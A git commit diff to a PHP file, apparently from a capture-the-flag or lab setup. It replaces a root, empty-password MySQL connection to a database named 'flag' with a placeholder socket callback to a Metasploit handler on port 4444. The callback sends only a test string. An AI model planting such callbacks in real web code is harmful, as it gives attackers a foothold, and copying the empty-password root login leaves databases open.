92d42dc6a1a14b2b868647979ee3d0f6a32a9fc6
cyber communinty <74042135+ankit637@users.noreply.github.com>
2023-10-21 23:34:19 +0530

    isro.php

--- isro.php
+++ isro.php
@@ -1,15 +1,22 @@
 <?php
-$servername = "192.168.92.202";
-$username = "root";
-$password = "";
-$dbname = "flag";
+$ip = '192.168.92.203';   // Replace with the IP address of your Metasploit handler
+$port = 4444;             // Replace with the port of your Metasploit handler
 
-try {
-    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
-    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-    echo "Connected successfully";
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+if ($socket === false) {
+    die("Failed to create socket: " . socket_strerror(socket_last_error()) . "\n");
 }
-catch(PDOException $e) {
-    echo "Connection failed: " . $e->getMessage();
+
+$result = socket_connect($socket, $ip, $port);
+if ($result === false) {
+    die("Failed to connect to Metasploit handler: " . socket_strerror(socket_last_error()) . "\n");
 }
+
+$payload = "Hello Metasploit!";  // Replace with your desired payload
+socket_write($socket, $payload, strlen($payload));
+
+$response = socket_read($socket, 1024);  // Read response from Metasploit handler
+echo "Received response: " . $response . "\n";
+
+socket_close($socket);
 ?>
